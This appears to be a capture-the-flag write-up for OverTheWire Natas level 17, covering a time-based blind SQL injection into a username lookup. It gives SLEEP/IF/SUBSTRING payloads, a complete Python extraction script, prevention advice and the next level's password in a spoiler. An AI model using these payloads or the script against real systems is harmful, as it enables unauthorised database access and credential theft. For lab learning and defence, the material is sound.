# Natas Level 17 → 18

## Objective

Retrieve the password for the next level by exploiting a Time-Based Blind SQL Injection vulnerability.

The application checks whether a username exists in the database but never displays the query result.

The goal is to extract the password stored in the database using response time differences.

---

## Enumeration

- Reviewed the webpage functionality.
- Found a username lookup feature.
- Submitted normal usernames.
- Reviewed the source code.
- Observed that user input is directly concatenated into an SQL query.
- Identified a possible SQL Injection vulnerability.

---

# Source Code Analysis

The application receives user input:

```php
if(array_key_exists("username", $_REQUEST)) {
```

The SQL query is constructed as:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
```

The query is executed:

```php
$res = mysqli_query($link, $query);
```

---

## Vulnerable Code

User input is inserted directly into the SQL statement.

Example:

```php
$query = "SELECT * FROM users WHERE username=\"USER_INPUT\"";
```

If the input is:

```text
alice
```

The executed query becomes:

```sql
SELECT * FROM users
WHERE username="alice"
```

Since user-controlled data reaches the SQL query without sanitization or prepared statements, SQL Injection is possible.

---

# Vulnerability

## Blind SQL Injection

Normally, an application would display whether the query returned any rows.

However, the output is commented out.

```php
//echo "This user exists.";
//echo "This user doesn't exist.";
```

Therefore:

- No query result is visible.
- No SQL errors are displayed.
- The page always appears identical.

This makes it a Blind SQL Injection vulnerability.

---

# Confirming SQL Injection

Payload:

```text
natas18" AND SLEEP(5) #
```

The SQL query becomes:

```sql
SELECT * FROM users
WHERE username="natas18" AND SLEEP(5) #
```

If the response is delayed by approximately five seconds, SQL Injection is confirmed.

---

# Why Direct Password Retrieval Fails

Trying:

```sql
natas18" UNION SELECT password FROM users #
```

Even if the query executes successfully, the application never displays the returned rows.

Because all output statements are commented out, no password is visible.

Therefore, data must be extracted indirectly.

---

# Exploitation Strategy

Since query results cannot be viewed, ask TRUE/FALSE questions.

MySQL provides the `IF()` function.

Example:

```sql
IF(condition, SLEEP(5), 0)
```

Meaning:

```text
If the condition is TRUE:
    Wait 5 seconds

Otherwise:
    Return immediately
```

The response time becomes the communication channel.

---

## Extracting One Character

Payload:

```sql
natas18" AND IF(
SUBSTRING(password,1,1)="a",
SLEEP(5),
0
) #
```

Meaning:

```text
Is the first password character equal to 'a'?
```

---

## Case 1 - Wrong Character

Suppose the password starts with:

```text
Bxxxx...
```

Payload:

```sql
SUBSTRING(password,1,1)="a"
```

Result:

```text
FALSE
```

Execution:

```sql
IF(FALSE,SLEEP(5),0)
```

The page responds immediately.

Result:

```text
Wrong character
```

---

## Case 2 - Correct Character

Suppose the password starts with:

```text
axxxx...
```

Payload:

```sql
SUBSTRING(password,1,1)="a"
```

Result:

```text
TRUE
```

Execution:

```sql
IF(TRUE,SLEEP(5),0)
```

The server waits five seconds.

Result:

```text
Correct character found
```

---

# Automation

Testing every character manually would require thousands of requests.

Python can automate the extraction.

## Logic

```python
password = ""

for each position:

    for each character:

        ask:
        Is this character correct?

        if response is delayed:

            save character
```

---

# Exploit Script

```python
import requests
import string
import time

url = "http://natas17.natas.labs.overthewire.org"

chars = string.ascii_letters + string.digits

password = ""

for pos in range(1,33):

    for ch in chars:

        payload = (
            f'natas18" AND '
            f'IF(SUBSTRING(password,{pos},1)="'
            f'{ch}",SLEEP(3),0)#'
        )

        start = time.time()

        requests.get(
            url,
            auth=("natas17","<password>"),
            params={"username":payload}
        )

        elapsed = time.time() - start

        if elapsed > 2.5:

            password += ch

            print(password)

            break

print(password)
```

---

# Optimization

Instead of testing every possible character, Binary Search can be used with ASCII values.

Example:

```sql
ASCII(SUBSTRING(password,1,1)) > 79
```

Each request eliminates half of the remaining possibilities.

Approximate comparison:

| Method | Requests per Character |
|---------|-----------------------:|
| Linear Search | ~62 |
| Binary Search | ~6 |

This significantly reduces the total number of requests.

---

# Attack Flow

```
Open Username Lookup
        |
        v
Review Source Code
        |
        v
Find SQL Query
        |
        v
Identify SQL Injection
        |
        v
Notice Blind Output
        |
        v
Confirm Injection Using SLEEP()
        |
        v
Create TRUE/FALSE Conditions
        |
        v
Measure Response Time
        |
        v
Extract Password Characters
        |
        v
Automate Extraction
        |
        v
Retrieve Next Password
```

---

# Result

The password was successfully extracted using Time-Based Blind SQL Injection.

Although the application never displayed query results, the response delay leaked the secret one character at a time.

---

# Prevention

- Always use prepared statements.

Example:

```php
$stmt = $link->prepare(
    "SELECT * FROM users WHERE username=?"
);
$stmt->bind_param("s",$username);
```

- Never concatenate user input directly into SQL queries.
- Validate user input.
- Disable detailed database errors in production.
- Apply the principle of least privilege to database accounts.

---

# Key Takeaways

- SQL Injection occurs when user input is directly inserted into SQL queries.
- Blind SQL Injection leaks information even without visible query results.
- Time-Based Blind SQL Injection uses response delays to infer TRUE/FALSE conditions.
- Functions like `SLEEP()`, `IF()`, `SUBSTRING()`, and `ASCII()` are commonly abused during exploitation.
- Automation makes blind attacks practical.
- Prepared statements eliminate SQL Injection vulnerabilities.

---

<details>
<summary><strong>🔑 Password (Spoiler)</strong></summary>

```text
Username : natas18
Password : xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
```

</details>